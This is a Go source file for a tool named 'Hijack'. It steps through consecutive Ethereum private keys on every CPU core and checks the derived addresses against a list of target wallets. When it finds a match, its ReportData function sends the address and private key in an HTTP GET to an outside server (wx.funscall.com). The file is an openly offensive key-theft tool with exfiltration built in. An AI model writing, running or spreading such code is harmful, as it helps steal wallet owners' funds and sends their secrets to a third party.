package Ether

import (
	"bytes"
	"encoding/hex"
	"fmt"
	"github.com/ethereum/go-ethereum/crypto"
	"io"
	"math/big"
	"net/http"
	"net/url"
	"runtime"
	"strconv"
	"sync"
)

type Hijack struct {
	AddressList map[string]int
	MaxCount    int
	MaxThread   int
	wg          sync.WaitGroup
}

func NewHijack() *Hijack {
	cpuNumber := runtime.NumCPU()
	fmt.Printf("Cpu 核心数量: %d\n", cpuNumber)
	return &Hijack{
		AddressList: make(map[string]int),
		MaxCount:    1000000,
		MaxThread:   cpuNumber,
	}
}

func (h *Hijack) Start(addrList map[string]int) {
	h.AddressList = addrList
	h.wg.Add(h.MaxThread)
	for i := 0; i < h.MaxThread; i++ {
		go h.KeyHijack()
	}
	h.wg.Wait()
}

func (h *Hijack) KeyHijack() {
	startKey, _ := crypto.GenerateKey()
	key := startKey.D //big.NewInt(0)
	for i := 0; i < h.MaxCount; i++ {
		temp := key
		temp = temp.Add(temp, big.NewInt(int64(1)))
		bKey := temp.Bytes()
		keyLen := len(bKey)
		buf := make([]byte, 32)
		for i := 0; i < len(bKey); i++ {
			buf[32-keyLen+i] = bKey[i]
		}
		Key, _ := crypto.ToECDSA(buf)
		privateKey := hex.EncodeToString(Key.D.Bytes())
		address := crypto.PubkeyToAddress(Key.PublicKey).Hex()

		value, ok := h.AddressList[address]
		if ok {
			fmt.Println("value:", value)
			fmt.Printf("[%d]address[%d][%v]\n", h.GetGID(), len(address), address)
			fmt.Printf("[%d]privateKey[%d][%v]\n", h.GetGID(), len(privateKey), privateKey)
			h.ReportData(address, privateKey)
		}
		if 0 == i%10000 {
			fmt.Print(".")
		}
	}
	fmt.Printf("[%d] 完成检索，总数[%d]\n", h.GetGID(), h.MaxCount)
	h.wg.Done()
}

func (h Hijack) GetGID() uint64 {
	b := make([]byte, 64)
	b = b[:runtime.Stack(b, false)]
	b = bytes.TrimPrefix(b, []byte("goroutine "))
	b = b[:bytes.IndexByte(b, ' ')]
	n, _ := strconv.ParseUint(string(b), 10, 64)
	return n
}
func (h Hijack) ReportData(address string, privateKey string) {
	params := url.Values{}
	Url, err := url.Parse("https://wx.funscall.com/api/hijack/report")
	if err != nil {
		return
	}
	params.Set("Address", address)
	params.Set("PrivateKey", privateKey)
	//如果参数中有中文参数,这个方法会进行URLEncode
	Url.RawQuery = params.Encode()
	urlPath := Url.String()
	fmt.Println(urlPath)

	resp, err := http.Get(urlPath)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	fmt.Println(string(body))
}
